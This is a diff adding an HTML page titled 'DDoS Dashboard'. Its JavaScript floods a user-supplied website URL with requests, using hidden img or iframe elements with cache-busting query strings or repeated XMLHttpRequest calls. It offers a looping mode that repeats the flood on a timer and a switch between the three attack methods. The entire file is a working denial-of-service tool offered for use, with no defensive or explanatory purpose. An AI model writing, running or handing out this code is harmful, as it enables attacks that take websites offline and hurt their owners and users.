@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en-US">
+	<head>
+		<title>Dashboard</title>
+		<meta charset="UTF-8">
+	</head>
+	<body>
+		<h2 id="0">DDoS Dashboard</h2>
+		<hr>
+		<div>
+			<table>
+				<tr>
+					<td>
+						Website URL:
+					</td>
+					<td>
+						<input id="url" type="text">
+					</td>
+				</tr>
+				<tr>
+					<td>
+						timeout(loop only):
+					</td>
+					<td>
+						<input id="timeout" type="text">
+					</td>
+				</tr>
+				<tr>
+					<td>
+						how many objects(&lt;128):
+					</td>
+					<td>
+						<input id="objNum" type="number">
+					</td>
+				</tr>
+				<tr>
+					<td>
+						<button onclick="run_once()">run once</button>
+					</td>
+					<td>
+						<button onclick="run_loop()">do loop</button>
+					</td>
+					<td>
+						<button onclick="cancel_loop()">cancel loop</button>
+					</td>
+				</tr>
+				<tr>
+					<td>
+						<button onclick="cancel_task()">cancel once task</button>
+					</td>
+					<td>
+						<button onclick="change_attack_method()">change attack method</button>
+					</td>
+				</tr>
+				<tr>
+					<td>
+						status:
+					</td>
+					<td id="statusTable">[Tip] Use this tool with F12 to get the best experience. 搭配 F12 使用此工具获得最佳体验.</td>
+				</tr>
+			</table>
+		</div>
+		<hr>
+
+		<div style="display: none;" id="attack_div">
+
+		</div>
+		<script>
+			let s = document.getElementById('statusTable')
+			window.attack_method = "IMG"
+			function createAttackObj(objNum) {
+				objNum = Number(objNum)
+				let attackDiv = document.getElementById("attack_div")
+				switch (window.attack_method) {
+					case "IMG":
+						for (let i = 0; i !== objNum; i++) {
+							let ImgObj = document.createElement('img')
+							ImgObj.id = i
+							attackDiv.appendChild(ImgObj)
+						}
+						break
+					case "IFR":
+						for (let i = 0; i !== objNum; i++) {
+							let ifrObj = document.createElement('iframe')
+							ifrObj.id = i
+							attackDiv.appendChild(ifrObj)
+						}
+						break
+					case "XHR":
+						console.log('XHR NOT NEED INIT.')
+						s.innerHTML = null
+				}
+				s.innerHTML = "Init ok."
+			}
+
+			function attackMain(url,objNum) {
+				s.innerHTML = "Flooding..."
+				if (window.attack_method === "XHR") {
+					const xhr = new XMLHttpRequest()
+
+					for (let i = 0; i !== objNum; i++) {
+						xhr.addEventListener('load',null)
+						xhr.open('GET',url)
+						xhr.send()
+					}
+				} else {
+					objNum = Number(objNum)
+					for (let i = 0; i !== objNum; i++) {
+						document.getElementById([i]).src = url + "?tid=" + Math.floor(Math.random() * 26843542684356)
+					}
+				}
+				s.innerHTML = "Request Sent!"
+			}
+
+			function init() {
+				createAttackObj(document.getElementById('objNum').value)
+			}
+			function run_once() {
+				init()
+				attackMain(document.getElementById('url').value,document.getElementById('objNum').value)
+			}
+			function run_loop() {
+				alert('if you want to stop, just close this page.\nmaybe your browser will crash.')
+				init()
+				let timeout_once = Number(document.getElementById('timeout').value)
+				window.LoopIntervalID = setInterval("run_once()",timeout_once)
+			}
+			function cancel_loop() {
+				clearInterval(window.LoopIntervalID)
+				s.innerHTML = "Loop Cancelled."
+			}
+			function cancel_task() {
+				let objNum = Number(document.getElementById('objNum').value)
+				for (let i = 0; i !== objNum; i++) {
+					document.getElementById([i]).src = "about:blank"
+				}
+				s.innerHTML = "Cancelled."
+			}
+			function change_attack_method() {
+				let showTxt = 'EMPTY'
+				switch (window.attack_method) {
+					case "IMG":
+						window.attack_method = "XHR";
+						showTxt = "Now the attack will use XMLHttpRequest\n [ ] Image\n [√] XMLHttpRequest\n [ ] Iframe (General)"
+						alert(showTxt);
+						s.innerHTML = showTxt
+						break
+					case "XHR":
+						window.attack_method = "IFR";
+						showTxt = "Now the attack will use Iframe\n [ ] Image\n [ ] XMLHttpRequest\n [√] Iframe (General)"
+						alert(showTxt)
+						s.innerHTML = showTxt
+						break
+					case "IFR":
+						window.attack_method = "IMG"
+						showTxt = "Now the attack will use Image\n [√] Image\n [ ] XMLHttpRequest\n [ ] Iframe (General)"
+						alert(showTxt)
+						s.innerHTML = showTxt
+						break
+				}
+			}
+		</script>
+	</body>
+</html>
